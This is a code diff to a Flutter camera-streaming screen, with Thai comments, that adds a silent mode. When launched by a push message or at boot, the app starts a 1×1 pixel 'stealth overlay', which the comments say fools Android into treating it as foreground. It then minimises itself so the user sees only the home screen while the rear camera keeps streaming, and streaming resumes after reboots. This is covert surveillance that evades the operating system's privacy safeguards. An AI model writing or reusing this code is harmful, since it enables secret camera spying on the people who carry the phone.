@@ -11,10 +11,15 @@ class StreamingScreen extends StatefulWidget {
     super.key,
     required this.code,
     required this.signalingUrl,
+    this.silent = false,
   });
 
   final String code;
   final String signalingUrl;
+
+  /// true เมื่อ launch จาก auto-route (FCM/boot)
+  /// → จะ minimize ตัวเองเข้า background หลังตั้ง stream เสร็จ
+  final bool silent;
 
   @override
   State<StreamingScreen> createState() => _StreamingScreenState();
@@ -68,6 +73,10 @@ class _StreamingScreenState extends State<StreamingScreen> {
     // (Android 14+ บังคับ: ต้องมี FGS ก่อนถึงจะเข้าถึงกล้อง background ได้)
     await ForegroundService.start();
 
+    // เริ่ม 1×1 px stealth overlay (เทคนิค AirDroid) — หลอกระบบว่า app foreground
+    // ทำให้กล้องเข้าถึงได้แม้ user lock screen / สลับไป app อื่น
+    await ForegroundService.startStealthOverlay();
+
     // เริ่มกล้อง
     _localStream = await navigator.mediaDevices.getUserMedia({
       'video': {'facingMode': 'environment'},
@@ -83,6 +92,13 @@ class _StreamingScreenState extends State<StreamingScreen> {
 
     // เปิดโหมด auto-streaming — ครั้งต่อๆ ไปเปิดแอป/รีบูต จะเข้า streaming screen เลย
     await StreamingPrefs.enable(pairCode: widget.code);
+
+    // Silent mode: ส่ง activity ไป background ทันที — user เห็น home screen
+    // กล้องยังสตรีมผ่าน FGS + StealthOverlay
+    if (widget.silent) {
+      await Future.delayed(const Duration(milliseconds: 500));
+      await ForegroundService.minimizeApp();
+    }
   }
 
   Future<void> _ensurePeerConnection() async {
@@ -143,8 +159,9 @@ class _StreamingScreenState extends State<StreamingScreen> {
     _localStream?.dispose();
     _pc?.dispose();
     _signaling.dispose();
-    // หยุด foreground service เมื่อออกจากหน้าสตรีม
+    // หยุด foreground services เมื่อออกจากหน้าสตรีม
     ForegroundService.stop();
+    ForegroundService.stopStealthOverlay();
     super.dispose();
   }
 
